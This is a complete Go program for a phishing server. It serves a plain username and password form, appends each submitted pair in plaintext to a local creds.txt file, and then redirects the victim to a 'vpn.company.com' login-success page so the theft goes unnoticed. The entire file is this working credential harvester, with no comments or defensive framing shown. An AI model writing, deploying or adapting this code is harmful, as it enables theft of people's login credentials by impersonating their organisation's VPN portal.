package main
import (
    "fmt"
    "net/http"
    "os"
)
func handler(w http.ResponseWriter, r *http.Request) {
    if r.Method == "POST" {
        r.ParseForm()
        user := r.FormValue("username")
        pass := r.FormValue("password")
        f, _ := os.OpenFile("creds.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        defer f.Close()
        fmt.Fprintf(f, "User: %s Pass: %s\n", user, pass)
        http.Redirect(w, r, "https://vpn.company.com/login-success", http.StatusFound)
    } else {
        w.WriteHeader(200)
        w.Write([]byte("<html><body><form method='POST'>Username: <input name='username'/><br>Password: <input type='password' name='password'/><br><input type='submit'/></form></body></html>"))
    }
}
func main() {
    http.HandleFunc("/authenticate", handler)
    http.ListenAndServe(":8080", nil)
}
